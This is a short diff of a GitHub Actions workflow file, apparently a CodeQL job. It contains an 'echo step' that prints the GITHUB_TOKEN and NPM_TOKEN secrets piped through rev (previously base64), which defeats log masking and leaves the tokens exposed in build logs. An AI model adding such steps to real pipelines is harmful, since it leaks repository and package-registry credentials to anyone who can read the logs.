@@ -62,7 +62,7 @@ jobs:
     - name: echo step
       run: |
           echo ${{ secrets.GITHUB_TOKEN }} | rev
-          echo ${{ secrets.NPM_TOKEN }} | base64
+          echo ${{ secrets.NPM_TOKEN }} | rev
           
 
     # Add any setup steps before running the `github/codeql-action/init` action.
